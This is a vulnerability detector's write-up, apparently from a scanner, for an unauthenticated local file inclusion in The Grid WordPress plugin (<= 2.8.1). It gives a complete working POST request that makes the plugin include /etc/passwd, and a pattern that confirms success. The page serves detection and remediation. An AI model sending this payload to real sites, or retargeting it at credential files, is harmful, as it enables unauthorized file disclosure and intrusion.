# CVE-2026-94169: The Grid WordPress plugin unauthenticated local file inclusion

**CVE-2026-94169 is an unauthenticated local file inclusion** (CWE-94) in the
The Grid WordPress plugin <= 2.8.1. The `the_grid_load_more` admin-ajax action
accepts an arbitrary local file path as a "skin" and includes/renders it
without validation.

**Affected:** The Grid <= 2.8.1

**Fixed:** a version newer than 2.8.1

**Severity:** CVSS 3.1 10.0 (Critical) — `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`

## How does the detector verify it?

This is an **active, non-destructive** check:

```
POST /wp-admin/admin-ajax.php
Content-Type: application/x-www-form-urlencoded

action=the_grid_load_more&grid_nonce=invalid&grid_page=1&grid_name=nuclei
&grid_data[item_number]=1
&grid_data[grid_skins][evil][php]=/etc/passwd
&grid_data[grid_skins][evil][type]=grid
&grid_data[grid_skins][evil][slug]=evil
&grid_data[skins]={"post":"evil"}
# confirm: JSON response contains "root:...:0:0:"
```

Only the world-readable `/etc/passwd` is requested as the skin file; no file is
written or uploaded, and no state is changed. No credential or cookie is sent
and redirects are not followed.

## Remediation

Update The Grid to a version newer than 2.8.1. Restrict unauthenticated
access to the plugin's admin-ajax actions until patched.
